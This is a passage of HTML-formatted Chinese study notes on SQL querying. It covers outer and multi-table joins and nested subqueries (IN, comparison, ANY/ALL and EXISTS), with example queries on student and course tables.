&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;LEFT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;OUTER&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;JOIN&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ON&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;此时会保留TAB1里面的所有记录，匹配对应的TAB2记录&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;多表连接查询&#34;&gt;多表连接查询
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;WHERE 表名1.列名1 = 表名2.列名2 AND 表名2.列名2 = 表名3.列名3&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;多表连接一般是先进行两个表的连接操作，再将其连接结果与第三个表执行连接&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;嵌套查询&#34;&gt;嵌套查询
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&#34;color:orange&#34;&gt;查询块&lt;/span&gt;：SELECT-FROM-WHERE&lt;/strong&gt;
&lt;strong&gt;&lt;span style=&#34;color:orange&#34;&gt;嵌套查询&lt;/span&gt;：将一个查询块嵌套在另一个查询块的WHERE子句或者HAVING子句&lt;/strong&gt;
&lt;strong&gt;上层的查询块称为外层查询/父查询；下层的查询块称为内层查询/子查询&lt;/strong&gt;
&lt;span style=&#34;color:red;font-size:18px&#34;&gt;&lt;strong&gt;子查询的SELECT语句中不能使用ORDERBY子句，ORDERBY子句只能对最终查询结果排序&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;集合判断in子查询&#34;&gt;集合判断IN子查询
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 列名 IN (子查询)&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;eg.查询alice的年级：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;GRADE&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CH&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;alice&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查询结果为alice在三年级，再查找三年级的其他学生：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CH&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;NU&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;GRADE&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面两个查询结合为嵌套查询：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CH&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;NU&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;GRADE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;IN&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	(&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;GRADE&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;CH&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;alice&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    );
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;本例的子查询条件不依赖于父查询，这类子查询称为不相关子查询&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;比较运算符子查询&#34;&gt;比较运算符子查询
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;WHERE 列名 比较运算符 (子查询)&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当明确知道子查询结果是单个值而不是集合的时候使用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg．在SC表中，找出每个学生（Sno）超过他自己选修课程平均成绩（Grade）的课程号（Cno)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;Cno&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SC&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;x&lt;/span&gt;    &lt;span style=&#34;color:#7f848e&#34;&gt;-- x是表 SC 的别名，又称为元组变量，可以用来表示 SC 的一个元组
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	(&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AVG&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SC&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;y&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;y&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;x&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;这里必须加上WHERE y.Sno=x.Sno这个条件，此时内外对应的sno才会相同，否则求的不是单个学生的平均成绩，而是所有学生的平均成绩&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本例的子查询条件依赖于父查询，这类子查询称为相关子查询，整个查询称为相关嵌套查询&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;anyall子查询&#34;&gt;ANY/ALL子查询
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;WHERE 列名 比较运算符 ANY/ALL (子查询)&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;谓词&lt;/th&gt;
          &lt;th&gt;语义&lt;/th&gt;
          &lt;th&gt;与聚集函数或 IN 的等价转换&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;gt;ANY&lt;/td&gt;
          &lt;td&gt;大于子查询结果中的某个值&lt;/td&gt;
          &lt;td&gt;&amp;gt;MIN&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;gt;ALL&lt;/td&gt;
          &lt;td&gt;大于子查询结果中的所有值&lt;/td&gt;
          &lt;td&gt;&amp;gt;MAX&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;lt;ANY&lt;/td&gt;
          &lt;td&gt;小于子查询结果中的某个值&lt;/td&gt;
          &lt;td&gt;&amp;lt;MAX&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;lt;ALL&lt;/td&gt;
          &lt;td&gt;小于子查询结果中的所有值&lt;/td&gt;
          &lt;td&gt;&amp;lt;MIN&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;gt;=ANY&lt;/td&gt;
          &lt;td&gt;大于等于子查询结果中的某个值&lt;/td&gt;
          &lt;td&gt;&amp;gt;=MIN&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;gt;=ALL&lt;/td&gt;
          &lt;td&gt;大于等于子查询结果中的所有值&lt;/td&gt;
          &lt;td&gt;&amp;gt;=MAX&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;lt;=ANY&lt;/td&gt;
          &lt;td&gt;小于等于子查询结果中的某个值&lt;/td&gt;
          &lt;td&gt;&amp;lt;=MAX&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;lt;=ALL&lt;/td&gt;
          &lt;td&gt;小于等于子查询结果中的所有值&lt;/td&gt;
          &lt;td&gt;&amp;lt;=MIN&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;=ANY&lt;/td&gt;
          &lt;td&gt;等于子查询结果中的某个值&lt;/td&gt;
          &lt;td&gt;IN&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;=ALL&lt;/td&gt;
          &lt;td&gt;等于子查询结果中的所有值（通常无实际意义）&lt;/td&gt;
          &lt;td&gt;&amp;ndash;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;!=(或&amp;lt;&amp;gt;)ANY&lt;/td&gt;
          &lt;td&gt;不等于子查询结果中的某个值&lt;/td&gt;
          &lt;td&gt;&amp;ndash;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;!=(或&amp;lt;&amp;gt;)ALL&lt;/td&gt;
          &lt;td&gt;不等于子查询结果中的任何值&lt;/td&gt;
          &lt;td&gt;NOT IN&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;eg.查询TAB1里面三年级学生学号大于23000的：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Ch&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;=&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;ANY&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	(&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Nu&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;STUDY&lt;/span&gt;.&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;tab1&amp;#34;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;exists子查询&#34;&gt;EXISTS子查询
&lt;/h4&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:15px&#34;&gt;&lt;strong&gt;EXISTS代表存在量词，对应的为NOT EXISTS&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:red;font-size:15px&#34;&gt;&lt;strong&gt;EXISTS谓词的子查询不返回数据，只返回逻辑&amp;rsquo;true&amp;rsquo;和&amp;rsquo;false&amp;rsquo;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;eg1.在SC表中查询至少选修了1号学生选修的全部课程（Cno）的学生的学号（Sno)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询学号为 x 的学生，对所有的课程 y，只要 1 号学生选修了课程 y，则 x 也选修了 y。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;令 p 表示&amp;quot;学生 1 号选修了课程 y&amp;quot;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;令 q 表示&amp;quot;学生 x 选修了课程 y&amp;quot;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;则上述查询可以表示为(∀y)p→q&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;通过等价转换，可得(∀y)p→q ≡ ¬(∃y(¬(p→q))) ≡ ¬(∃y(¬(¬p∨q))) ≡ ¬∃y(p∧¬q)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最终用 SQL 实现的表达式 ¬∃y(p∧¬q)，语义：不存在这样的课程 y，学生 1 号选修了 y，而学生 x 没有选修&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;DISTINCT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SC&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SCX&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;EXISTS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    (&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;                            &lt;span style=&#34;color:#7f848e&#34;&gt;-- 由EXISTS引I出的子查询，其目标列表达式通常都用*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SC&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SCY&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SCY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;EXISTS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         (&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SC&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SCZ&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SCZ&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SCX&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SCZ&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Cno&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SCY&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Cno&lt;/span&gt;)   &lt;span style=&#34;color:#7f848e&#34;&gt;-- 保证内外指向相同的学生
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;    );
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg2.基于 SC 表，查询选修了全部课程（Course 表）的学生姓名（Student 表）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;令 p 表示&amp;quot;课程 x 被学生 y 选修了&amp;quot;，则有(∀x)p ≡ ¬(∃x(¬p))，语义：查询没有任何课程是其不选修的学生 y&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Sname&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Student&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;EXISTS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    (&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Course&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;EXISTS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         (&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;SC&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;Student&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Sno&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Cno&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;Course&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Cno&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    );
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;集合查询&#34;&gt;集合查询
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:18px&#34;&gt;&lt;strong&gt;多个SELECT语句的结果可以进行集合的并（UNION)、交（INTERSECT)、差（EXCEPT）&lt;/strong&gt;&lt;/span&gt;
